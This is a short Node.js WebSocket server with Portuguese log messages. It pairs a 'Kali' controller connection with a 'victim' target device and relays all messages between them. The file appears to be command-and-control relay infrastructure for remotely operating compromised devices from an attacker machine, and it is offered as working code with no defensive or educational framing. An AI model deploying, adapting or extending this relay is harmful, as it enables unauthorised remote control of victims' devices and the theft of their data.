const WebSocket = require('ws');
const http = require('http');
const server = http.createServer();
const wss = new WebSocket.Server({ server });

let kali = null;
let victim = null;

wss.on('connection', (ws, req) => {
    const url = req.url.toLowerCase(); 
    console.log(`Nova tentativa de conexão: ${url}`);

    if (url.includes('kali')) {
        kali = ws;
        console.log("SISTEMA: Controlador Kali Online.");
    } else {
        victim = ws;
        console.log("SISTEMA: Dispositivo Alvo conectado.");
    }

    ws.on('message', (data) => {
        // Se for o Kali mandando, vai para a vítima
        if (ws === kali && victim && victim.readyState === WebSocket.OPEN) {
            victim.send(data);
        } 
        // Se for a Vítima mandando, vai para o Kali
        else if (ws === victim && kali && kali.readyState === WebSocket.OPEN) {
            kali.send(data);
        }
    });

    ws.on('close', () => {
        if (ws === kali) { console.log("Kali desconectou."); kali = null; }
        if (ws === victim) { console.log("Vítima desconectou."); victim = null; }
    });
});

server.listen(process.env.PORT || 10000);
